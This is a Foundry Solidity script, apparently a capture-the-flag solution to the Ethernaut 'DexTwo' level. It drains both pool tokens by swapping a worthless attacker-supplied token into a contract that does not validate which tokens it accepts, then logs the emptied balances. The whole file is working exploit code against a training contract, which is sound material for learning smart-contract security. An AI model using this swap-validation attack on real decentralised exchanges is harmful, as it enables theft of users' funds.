// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel23.sol";

contract POC is Script {

    DexTwo level23 = DexTwo(0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5);
    function run() external{
        vm.startBroadcast();
        address ZTN = address(0xAFE3F881306476e9F6B88cFB224E66d5484c22C1);
        address token1 = level23.token1();
        address token2 = level23.token2();

        level23.swap(ZTN, token1, 100);
        level23.swap(ZTN, token2, 200);

        console.log("Remaining token1 balance : ", level23.balanceOf(token1, address(level23)));
        console.log("Remaining token2 balance : ", level23.balanceOf(token2, address(level23)));
        vm.stopBroadcast();
    }
}